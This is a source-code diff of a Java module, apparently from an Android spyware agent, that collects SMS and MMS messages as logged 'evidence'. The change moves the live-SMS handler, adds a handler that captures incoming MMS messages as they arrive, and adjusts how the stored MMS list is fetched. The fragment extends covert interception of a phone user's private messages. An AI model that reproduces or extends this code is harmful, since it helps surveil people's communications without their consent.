@@ -67,7 +67,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 			}
 
 			final MmsBrowser mmsBrowser = new MmsBrowser();
-			final ArrayList<Mms> listMms = mmsBrowser.getMmsList();
+			final ArrayList<Mms> listMms = mmsBrowser.getMmsList(0);
 			final Iterator<Mms> iterMms = listMms.listIterator();
 
 			while (iterMms.hasNext()) {
@@ -104,12 +104,6 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 	}
 
-	public int notification(Sms s) {
-		// Live SMS
-		saveSms(s);
-		return 0;
-	}
-
 	private void saveSms(Sms sms) {
 		final String address = sms.getAddress();
 		final byte[] body = WChar.getBytes(sms.getBody());
@@ -121,7 +115,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 	private void saveMms(Mms mms) {
 		final String address = mms.getAddress();
-		// MMS Subject: 
+		// MMS Subject:
 		final byte[] subject = WChar.getBytes(Messages.getString("10.1") + mms.getSubject()); //$NON-NLS-1$
 		final long date = mms.getDate();
 		final DateTime filetime = new DateTime(date);
@@ -158,5 +152,17 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		databuffer.write(Utils.padByteArray(to.getBytes(), 16));
 
 		new LogR(EvidenceType.SMS_NEW, additionalData, body);
+	}
+
+	public int notification(Sms s) {
+		// Live SMS
+		saveSms(s);
+		return 0;
+	}
+
+	public int notification(Mms mms) {
+		saveMms(mms);
+		return 0;
+
 	}
 }
